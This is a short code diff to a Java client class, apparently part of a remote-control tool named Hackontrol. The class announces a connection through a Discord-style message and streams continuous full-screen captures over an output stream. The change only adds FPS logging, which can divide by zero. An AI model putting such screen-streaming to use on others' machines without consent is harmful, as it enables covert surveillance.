@@ -38,6 +38,9 @@ public class HRSPClient {
 		consumer.accept(new MessageCreateBuilder().setContent("**Connected**").addActionRow(HackontrolButton.delete()).build());
 		Robot robot = new Robot();
 		Rectangle bounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+		long last = 0L;
+		long total = 0L;
+		long frames = 0L;
 
 		while(true) {
 			BufferedImage image = robot.createScreenCapture(bounds);
@@ -50,6 +53,13 @@ public class HRSPClient {
 			outputStream.write(data.length & 0xFF);
 			outputStream.write(data);
 			outputStream.flush();
+			long time = System.currentTimeMillis();
+			long difference = time - last;
+			last = time;
+			long fps = 1000L / difference;
+			frames++;
+			total += fps;
+			System.out.println(fps + " FPS (Average: " + (((double) total) / ((double) frames)) + ")");
 		}
 	}
 }
